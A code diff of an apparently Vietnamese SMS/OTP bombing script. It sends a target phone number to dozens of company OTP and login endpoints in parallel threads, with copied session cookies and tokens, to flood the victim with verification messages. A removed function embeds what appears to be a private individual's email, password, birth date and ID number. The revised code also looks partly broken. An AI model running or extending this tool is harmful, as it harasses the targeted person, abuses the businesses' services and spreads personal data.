@@ -1,35 +1,31 @@
-# -*- coding: utf-8 -*-
-
-import requests
-import concurrent.futures
-import time
-from datetime import date
-from datetime import datetime, timedelta
-from bs4 import BeautifulSoup 
-from time import sleep
-from pathlib import Path
-from tqdm import tqdm 
 import sys
-import urllib3,unicodedata
+import time
+import json
+from concurrent.futures import ThreadPoolExecutor
+import requests
 
-import requests,logging,urllib3,json,threading,time
-from threading import Thread
-import io
-from urllib3.exceptions import InsecureRequestWarning
-logging.getLogger("requests").setLevel(logging.WARNING)
-logging.getLogger("urllib3").setLevel(logging.WARNING)
-urllib3.disable_warnings()
-sys.stdout.reconfigure(encoding='utf-8')
+# Cấu hình lấy thông tin
+threading = ThreadPoolExecutor(max_workers=int(30))
+phone = sys.argv[1]
+amount = int(sys.argv[2])
+
+# Hàm spam API
+def popeyes(sdt):
+    headers = {
+        'Host': 'api.popeyes.vn'
+    }
+    # Tiếp tục viết mã của bạn ở đây
+
 def tv360(phone):
-  data = '{"msisdn":"phone"}'
-  data = data.replace("phone",phone)
-  head = {
-    "Host":"m.tv360.vn",
-    "accept":"application/json, text/plain, */*",
-    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
-    "content-type":"application/json"
-  }
-  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
+    data = '{"msisdn":"phone"}'
+    data = data.replace("phone", phone)
+    head = {
+        "Host": "m.tv360.vn",
+        "accept": "application/json, text/plain, */*",
+        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+        "content-type": "application/json"
+    }
+    rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login", data=data, headers=head).json()
 #
 def robot(phone):
     cookies = {
@@ -403,8 +399,122 @@ def meta(phone):
     json=json_data,
 )
    
+###
+def blu(phone):
+    cookies = {
+    'DMX_View': 'DESKTOP',
+    'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
+    '_gcl_au': '1.1.804133484.1690973397',
+    '_gid': 'GA1.2.1071358409.1690973397',
+    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
+    '_pk_id.8.8977': 'c624660949009f11.1690973398.',
+    '_pk_ses.8.8977': '1',
+    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
+    'cebs': '1',
+    '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
+    '_fbp': 'fb.1.1690973400267.315266557',
+    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
+    '_ce.clock_event': '1',
+    '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
+    'lhc_per': 'vid|c3330ef02699a3239f3d',
+    '_gat_UA-38936689-1': '1',
+    '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
+    '_ga': 'GA1.1.1906131468.1690973397',
+    'SvID': 'dmxcart2737|ZMo2n|ZMo01',
+    'cebsp_': '2',
+}
 
+    headers = {
+    'authority': 'www.dienmayxanh.com',
+    'accept': '*/*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
+    'origin': 'https://www.dienmayxanh.com',
+    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
 
+    data = {
+    'phoneNumber': phone,
+    'isReSend': 'false',
+    'sendOTPType': '1',
+    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
+}
+ 
+    response = requests.post(
+    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+)
+   
+  ###
+def tgdt(phone):
+    cookies = {
+    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
+    '_gcl_au': '1.1.1121422736.1720077126',
+    '_ga': 'GA1.1.304095547.1720077127',
+    '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
+    '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
+    '_fbp': 'fb.1.1720077128189.217218927440922861',
+    'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
+    '___utmvm': '###########',
+    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
+    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
+    '_pk_ses.8.8977': '1',
+    'SvID': 'new2688|Zoaz1|Zoaz0',
+    '_ce.irv': 'returning',
+    'cebs': '1',
+    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
+    'cebsp_': '2',
+    '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
+    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
+    '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
+}
+
+    headers = {
+    'Accept': '*/*',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
+    'Origin': 'https://www.dienmayxanh.com',
+    'Pragma': 'no-cache',
+    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'X-Requested-With': 'XMLHttpRequest',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    data = {
+    'phoneNumber': phone,
+    'isReSend': 'false',
+    'sendOTPType': '1',
+    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
+}
+
+    response = requests.post(
+    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+)
+   
+        ###
 def concung(phone):
     cookies = {
     'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
@@ -870,7 +980,7 @@ def gala(phone):
 
     response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
 ####
-def ahamove(phone):
+def ahamove(sdt):
     headers = {
     'accept': 'application/json, text/plain, */*',
     'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
@@ -1547,51 +1657,7 @@ def otpmu(phone):
 }
 
     response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
-def cathay(phone):
-    cookies = {
-    'JSESSIONID': 'u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74',
-    'TS01f67c5d': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
-    'BIGipServerB2C_http': '!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==',
-    'TS0173f952': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
-    '_ga': 'GA1.3.1657492692.1720889869',
-    '_gid': 'GA1.3.636332226.1720889871',
-    'INITSESSIONID': '3f1d8cc9b54babdfc46573d45f59224f',
-    '_ga_M0ZP5CJBQZ': 'GS1.1.1720889868.1.0.1720889887.0.0.0',
-}
 
-    headers = {
-    'Accept': 'application/json, text/javascript, */*; q=0.01',
-    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-    'Cache-Control': 'no-cache',
-    'Connection': 'keep-alive',
-    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'Cookie': 'JSESSIONID=u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; BIGipServerB2C_http=!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==; TS0173f952=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; _ga=GA1.3.1657492692.1720889869; _gid=GA1.3.636332226.1720889871; INITSESSIONID=3f1d8cc9b54babdfc46573d45f59224f; _ga_M0ZP5CJBQZ=GS1.1.1720889868.1.0.1720889887.0.0.0',
-    'Origin': 'https://www.cathaylife.com.vn',
-    'Pragma': 'no-cache',
-    'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'X-Requested-With': 'XMLHttpRequest',
-    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-}
-
-    data = {
-    'memberMap': '{"userName":"trongkhai611@gmail.com","password":"ditmetzk","birthday":"19/07/1988","certificateNumber":"001088647384","phone":"' + phone + '","email":"trongkhai611@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"NGUYỄN HUY HOÀNG"}',
-    'OTP_TYPE': 'P',
-    'LANGS': 'vi_VN',
-}
-
-
-    response = requests.post(
-    'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
 def vina(phone):
     cookies = {
     '_gcl_au': '1.1.998139933.1720624574',
@@ -1726,6 +1792,69 @@ def fa(phone):
 }
 
     response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
+def sms3(phone):
+    headers = {
+        'authority': 'kingme.pro',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
+        'dnt': '1',
+        'origin': 'https://kingme.pro',
+        'referer': 'https://kingme.pro/',
+        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phoneNumber': phone,
+    }
+
+    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data)
+def chotot(phone):
+    cookies = {
+        'ipqsd': '341942561532813760',
+        'device_id_1721542005': 'PG6FXZbjBE-1721542005',
+        'ct-idfp': 'ce5d2928-a3c2-5165-88e8-bb4cd213c649',
+        '_cfuvid': 'ORpuQ1Ac0n2fXd3xJ.G_iDI2pBJopaKiqt_6RDvSR.Q-1721974830041-0.0.1.1-604800000',
+        'cf_clearance': 'rsXXH9bbBRznYM9.JdvJKjnnIkoxUeaxnvszMoz4se4-1721974832-1.0.1.1-H27burCUSc0WWyuAiZi3AcIC8kk7_p1K9dsO3cG7QYWCfh5eXh1fTKAjscFL2EH4UhWZzc4BnbyZgrjTOwTUyQ',
+    }
+
+    headers = {
+        'authority': 'id.chotot.com',
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=df6d9c7e225640bfad7e87f097cc4fe9,sentry-sample_rate=0.1',
+        'referer': 'https://id.chotot.com/register',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'sentry-trace': 'df6d9c7e225640bfad7e87f097cc4fe9-968a246074f5abf4-0',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'x-nextjs-data': '1',
+    }
+
+    params = {
+        'phone': phone,
+    }
+
+    response = requests.get(
+        'https://id.chotot.com/_next/data/aL54km2oo9eriIzv-Ickg/register/otp.json',
+        params=params,
+        cookies=cookies,
+        headers=headers
+    )
+    
+
 def sapo(phone):
     cookies = {
     '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
@@ -1786,84 +1915,38 @@ def sapo(phone):
 }
 
     response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
-    
-# Định nghĩa danh sách các hàm API ở phạm vi toàn cục
+import concurrent.futures
+import time
+import sys
+
+# Define your functions here
 functions = [
-    tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana,
-    med, ghn, shop, gala, fa, cathay, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo, shop, beau, fu, lote, lon
+    chotot, tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu,
+    tgdt, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana,
+    med, ghn, shop, sms3, gala, fa, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo, shop, beau, fu, lote, lon
 ]
 
-def run(phone, i, stop_event):
-    if stop_event.is_set():
-        return False
-    functions[i](phone)
-    return True
-    
-def main():
-    if len(sys.argv) != 5:
-        print("Usage: python sms.py <sdt> <time> <delay> <luong>")
-        print("Example: python sms.py 0123456789 60 1 5")
-        sys.exit(1)
+def run(phone, i):
+    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+        futures = [executor.submit(fn, phone) for fn in functions]
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                future.result()
+            except Exception as exc:
+                print(f'Generated an exception: {exc}')
 
-    phone = sys.argv[1]
-    total_time = int(sys.argv[2])  # Thời gian chạy tổng cộng (giây)
-    delay = int(sys.argv[3])       # Delay giữa mỗi lần spam (giây)
-    luong_chay = int(sys.argv[4])  # Số luồng chạy cùng lúc
-
-    print("SRC BY: MinhNguyen3004")
-    print(f"Số điện thoại: {phone}")
-    print(f"Thời gian chạy: {total_time} giây")
-    print(f"Delay: {delay} giây")
-    print(f"Số luồng: {luong_chay}")
-
-    threads_quan_li = []
-    stop_event = threading.Event()
-    dem_func = 0
-    count = 0
-    start_time = time.time()
-
-    # Hàm kiểm tra thời gian và dừng chương trình
-    def check_time():
-        while True:
-            if time.time() - start_time >= total_time:
-                stop_event.set()
-                print("\nHết thời gian chạy, chương trình đang dừng...")
-                break
-            time.sleep(1)
-
-    # Bắt đầu thread kiểm tra thời gian
-    time_thread = threading.Thread(target=check_time)
-    time_thread.daemon = True
-    time_thread.start()
-
-    while not stop_event.is_set():
-        dem_func += 1
-        if dem_func >= len(functions):
-            dem_func = 0
-        count += 1
-        
-        # Quản lý luồng
-        if len(threads_quan_li) >= luong_chay:
-            while True:
-                if len(threads_quan_li) < luong_chay or stop_event.is_set():
-                    break
-                for luong in threads_quan_li[:]:
-                    if not luong.is_alive():
-                        threads_quan_li.remove(luong)
-                time.sleep(0.1)
-        
-        if not stop_event.is_set():
-            thread = threading.Thread(target=run, args=(phone, dem_func, stop_event))
-            thread.start()
-            threads_quan_li.append(thread)
-            print(f"Spam thành công, lần {count}")
-            time.sleep(delay)
-
-    # Đợi tất cả các thread hoàn thành trước khi thoát
-    for thread in threads_quan_li:
-        thread.join()
-    
-    print("Chương trình đã kết thúc.")
+    print(f"Spam thành công lần {i}")
